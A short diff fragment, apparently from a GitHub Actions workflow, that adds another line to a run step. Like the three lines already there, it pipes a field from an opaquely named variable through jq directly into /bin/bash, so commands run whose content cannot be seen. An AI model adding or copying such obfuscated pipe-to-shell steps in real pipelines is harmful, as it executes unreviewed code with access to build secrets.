@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$uw592" | jq -r .ioe47 | /bin/bash
           echo $r8 | jq -r .pykcm2 | /bin/bash
           echo $rmakd81 | jq -r .tl68 | /bin/bash
+          echo $dwc65 | jq -r .kq53 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
